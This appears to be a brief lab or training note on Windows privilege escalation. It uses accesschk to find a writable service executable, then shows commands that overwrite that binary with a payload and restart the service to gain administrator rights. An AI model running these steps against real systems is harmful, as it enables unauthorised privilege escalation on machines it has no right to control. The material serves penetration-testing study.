# Executable Files

like the pervious example but we target`.exe` programs which run in background

### **Detection**

```powershell
C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```

![2025-07-06 14\_39\_08-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 06_14_39_08 Kali_Linux_ _VMware_Workstation.png>)

we have a permission to edit on file call `filepermservice.exe` so we can replace it by our shell to add himself in admin group

***

### Exploitation

```powershell
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc
```

![2025-07-06 14\_43\_18-Kali Linux - VMware Workstation.png](<../../../.gitbook/assets/2025 07 06_14_43_18 Kali_Linux_ _VMware_Workstation.png>)
